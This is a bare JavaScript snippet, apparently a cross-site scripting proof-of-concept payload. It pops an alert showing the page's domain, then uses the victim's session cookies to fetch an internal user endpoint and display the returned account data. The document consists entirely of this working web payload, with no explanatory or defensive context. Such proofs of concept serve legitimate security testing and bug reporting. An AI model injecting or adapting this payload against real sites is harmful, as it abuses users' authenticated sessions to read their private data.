alert(document.domain)

fetch("/internal/user", {
  "credentials": "include",
}).then(response => response.json()).then(data => alert(JSON.stringify(data)));
